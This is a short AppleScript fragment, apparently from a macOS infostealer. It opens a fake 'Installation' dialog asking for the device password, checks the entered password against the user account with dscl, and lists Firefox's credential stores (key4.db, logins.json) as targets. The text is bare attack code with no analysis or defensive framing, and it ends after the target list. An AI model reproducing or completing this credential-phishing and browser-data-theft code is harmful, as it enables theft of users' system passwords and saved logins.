set accountName to system attribute "USER"
set answer to display dialog "Please enter device password to continue." default answer "" with title "Installation" with hidden answer
set checkResult to do shell script "dscl . authonly " & accountName & space & text returned of answer
set profileRoot to "/Library/Application Support/Firefox/Profiles/"
set credentialFiles to {"/key4.db", "/logins.json"}
